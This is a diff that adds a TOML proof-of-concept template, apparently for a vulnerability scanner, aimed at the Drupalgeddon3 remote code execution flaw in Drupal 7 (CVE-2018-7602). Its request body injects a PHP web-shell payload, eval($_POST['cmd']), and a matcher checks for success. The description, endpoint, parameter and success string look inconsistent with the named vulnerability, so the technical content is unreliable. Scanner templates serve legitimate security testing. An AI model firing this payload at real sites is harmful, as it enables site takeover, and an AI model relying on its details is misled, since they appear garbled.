@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "本 PoC 验证针对 Drupal 7.x (< 7.58) 版本的 Drupalgeddon3 远程代码执行漏洞。攻击者在认证后可通过构造恶意请求实现任意代码执行，导致 Drupal 站点被完全接管。利用 Drupal 8.x 的 Image module 和 Drupal 7.x 的 Aggregator module 中的代码执行漏洞。"
+id = "POC-AVE-2018-1000"
+name = "Drupalgeddon3 远程代码执行漏洞 PoC"
+severity = "critical"
+tags = ["ave-2018-1000"]
+vuln_id = [
+    "CVE-2018-7602",
+    "AVE-2018-1000",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/admin/config/development/features"
+protocol = "http"
+
+[poc.requests.body]
+content = "js_opcodes[APC]=eval($_POST['cmd']);&_txt=Deploy&_form_build_id={{BUILD_ID}}"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Module deployed successfully"]
